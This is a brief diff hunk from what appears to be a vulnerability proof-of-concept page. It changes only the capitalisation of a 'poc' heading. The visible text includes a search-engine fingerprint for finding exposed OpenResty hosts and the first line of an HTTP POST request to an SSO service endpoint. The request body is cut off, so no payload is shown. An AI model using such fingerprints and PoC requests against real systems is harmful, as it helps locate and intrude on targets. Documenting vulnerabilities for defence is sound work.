@@ -8,7 +8,7 @@
 header="X-Content-Type-Options: nosniff" && body="<h1>Welcome to OpenResty!</h1>" && header="X-Xss-Protection: 1; mode=block"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /bic/ssoService/v1/applyST HTTP/1.1
